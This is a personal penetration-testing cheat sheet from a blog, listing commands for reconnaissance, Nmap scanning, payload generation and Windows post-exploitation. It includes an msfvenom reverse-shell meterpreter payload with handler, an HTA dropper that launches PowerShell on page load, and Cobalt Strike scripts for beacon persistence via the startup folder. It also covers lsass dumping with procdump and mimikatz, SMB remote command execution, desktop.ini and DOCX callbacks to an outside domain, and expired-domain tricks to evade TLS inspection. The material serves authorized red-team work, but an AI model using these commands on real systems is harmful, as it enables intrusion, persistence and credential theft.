---
title: 'Penetration Testing Reference Sheet'
date: '2019-02-18 16:30:24'
tags: pentesting cheatsheets
---

This post is a "living document," intended for me to keep a quick-and-dirty reference sheet around at all times, rather than as a standalone post. It will be updated with items that I find I need to refer to multiple times.

# Passive Recon
## Discover Scripts
[https://github.com/leebaird/discover](https://github.com/leebaird/discover)

# Active Recon
## DDE Office File

Create a new .docx with field code:

```
http://domain.tld/path/totoken/index.html
or
http://subdomain.domain.tld
```
1. Insert
2. Quick Parts
3. Field
4. IncludePicture
5. After pasting above, add \d
6. Should look like:
```
{ INCLUDEPICTURE "http://domain.tld/path/totoken/index.html" \d \* MERGEFORMAT }
or
{ INCLUDEPICTURE \d "http://domain.tld/path/totoken/index.html" \* MERGEFORMAT }
```

# Active Network Enumeration
## Nmap
### Identifying live targets from a specific network range
`nmap -sn -oA <outputfile> <network(s)>`
### Identifying live targets from a provided host/range list
`nmap -sn -oA <outputfile> -iL <inputfile.txt>`

Note: parse output above for live hosts before port scanning to save time.
### Identifying open TCP ports
`nmap -sS -p0-65535 -oA <outputfile> -iL <inputfile>`

### Scanning for service version banners and OS fingerprinting
`nmap -sV -O -oA <outputfile> -p <ports> -iL <inputfile>`

### Scanning for common vulnerabilities
`nmap -sC --script=vuln -oA <outputfile> -p <ports> -iL <inputfile>`

## EyeWitness
### Screenshotting HTTP/S targets
`/opt/EyeWitness/EyeWitness.py --web --prepend-https -f <inputfile>`

### Screenshotting RDP targets
`/opt/EyeWitness/EyeWitness.py --rdp --ocr -f <inputfile>`

## SMBMap
### Scan for unauthenticated shares on target
`smbmap -H <target>`

### Scan for authenticated shares on target
`smbmap -H <target> -u <username> -p <password> -d <domain>`

### Execute a command via SMB
`smbmap -H <target> -u <username> -p <password> -d <domain> -x <command>`

## Cewl
### Generate word and email lists from page
`cewl -w <wordsoutputfile> -a -e --email_file <emailsoutputfile> -v <target>`

# Parsing output
## Cutting Nmap results
### Parsing live hosts from discovery scan
`grep Host <inputfile.gnmap> | cut -d" " -f 2 | sort -u > <outputfile>`

### Listing unique open ports from a previous scan
`grep syn-ack <inputfile.nmap> | cut -d/ -f 1 | sort -u > <outputfile>`

### Removing line breaks and inserting commas for Nmap port specification
`sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}' < <inputfile>`

# Automation
## Bash
### Repeat command for each line of a file
`while read ip; do <command> "$ip"; done < <inputfile>`

Good for automating commands that only accept one target.

### Save command output to file
`<command> | tee <outputfile>`

Useful for tools that don't have a logging feature, e.g. SMBMap.

### Rename multiple files in a folder while keeping their extension
``` bash
a=1
for i in *.ext; do
  num=$(printf "%04d.ext" "$a")
  mv -i -- "$i" "<prefix>-$(date +%Y-%m-%d)-$num"
  let a=a+1
done
```

Useful date/time variables to include in file names:
$(date +%Y-%m-%d-%H-%M-%S)


## Windows CLI
### Ping scan /24 range via loop
`FOR /L %i in (1,1,255) do @ping -n 1 <prefix>.%i | find "Reply"`

## Cobalt Strike Aggressor Scripting
### Automate setup for DNS beacon
```
on beacon_initial_empty {
	bnote($1,"Established: " . formatDate('MM/dd/yyyy HH:mm:ss (z)'));
	bmode($1, "dns-txt");
	bcheckin($1);
}
```
### Automate initial information gathering on new DNS beacon
```
on beacon_initial {
	binput($1, "Groups");
	bshell!($1, "whoami /groups");
	binput($1, "Processes");
	bshell!($1, "tasklist /v");
	binput($1, "Connections");
	bshell!($1, "netstat -na | findstr \"EST\"");
	binput($1, "System Info");
	bshell!($1, "systeminfo");
	binput($1, "DNS Cache");
	bshell!($1, "ipconfig /displaydns");
}
```
### Automate simple persistence on new DNS beacon
```
on beacon_initial {
	bcp($1, "FILEHERE", "c:\\users\\" . binfo($1, "user") . "\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\startfile.EXTHERE");
}
```
# Python virtual environments
## Install virtualenv
`pip install virtualenv`

## Create a new virtualenv
`virtualenv <directory>`

## Use an existing virtualenv
`source <directory>/bin/activate`

## Exit currently active virtualenv
`deactivate`

# Wordlists
## Kali built-in
~~~ bash
/usr/share/wordlists/
├── dirb -> /usr/share/dirb/wordlists
├── dirbuster -> /usr/share/dirbuster/wordlists
├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
├── metasploit -> /usr/share/metasploit-framework/data/wordlists
├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
├── rockyou.txt.gz
├── sqlmap.txt -> /usr/share/sqlmap/txt/wordlist.txt
└── wfuzz -> /usr/share/wfuzz/wordlist
~~~

## Seclists
[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

# SSL/TLS interdiction evasion
## DomainGain
Use to identify an expired domain categorized as a non-interdicted category (e.g., healthcare).

[https://github.com/fullmetalcache/domainGain](https://github.com/fullmetalcache/domainGain)

# Generating exploit payloads
## Veil (the newer way)
[https://github.com/Veil-Framework/](https://github.com/Veil-Framework/)

## MSFVenom (the old way)
### Generating a typical payload
`msfvenom -f exe -e x86/shikata_ga_nai -a x64 -p windows/x64/meterpreter_reverse_https lhost=<ip> lport=<port>  -i <count> -o <outputfile>`

There are numerous ways to generate payloads.

## MSFConsole
### Creating a handler for the above payload
```
msfconsole
set payload windows/x64/meterpreter_reverse_https
set LHOST <ip>
set LPORT <port>
```

Settings for the handlers must match those of the payload.

# Dropping payloads
## Invoke-CradleCrafter
[https://github.com/danielbohannon/Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)

`PS > Import-Module Invoke-CradleCrafter.ps1 && import-module Out-Cradle.ps1`

Obfuscate all the things, drop into batch/hta/whatever.

## HTA file dropper
``` html
<script language="VBScript">
    Sub a
        Set z = CreateObject("Wscript.Shell")
        command = "%systemroot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -noexit whatever"
        z.Run command
    End Sub
</script>
<body onload="a">
```

# Post-exploitation

## Windows

### Internal Enumeration/Calling Card

Create subfolder of desired location. Inside created folder, create desktop.ini:
```
[.ShellClassInfo]
IconResource=\\%USERNAME%.%COMPUTERNAME%.%USERDOMAIN%.INI.subdomain.domain.tld\resource.dll
```

Note: Attempting to navigate into the new folder will result in hourglass since resource does not exist. Do not put desktop.ini in a high-traffic folder. Placing token will record traversal one level above, as well as into the new folder.

### System/context Enumeration
`whoami`

`hostname`

`ipconfig /displaydns`

### Service enumeration
`net start`

### Service manipulation

`net stop <servicename>`

`net start <servicename>`

`sc stop <servicename>`

`sc start <servicename>`

### ARP cache enumeration
`arp -a`

### Credential gathering
#### Procdump
`procdump[64].exe -accepteula -ma lsass.exe <outputfile>`

Save the output file for parsing offline with mimikatz.

#### Mimikatz
`privilege::debug`

`sekurlsa::logonPasswords full`

More to come...
